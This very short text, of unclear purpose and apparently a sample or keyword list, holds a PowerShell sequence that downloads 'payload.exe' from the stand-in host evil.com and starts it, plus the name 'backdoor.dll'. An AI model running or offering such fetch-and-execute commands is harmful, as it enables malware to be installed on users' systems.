﻿powershell.exe

Invoke-WebRequest https://evil.com/payload.exe

Start-Process payload.exe

backdoor.dll
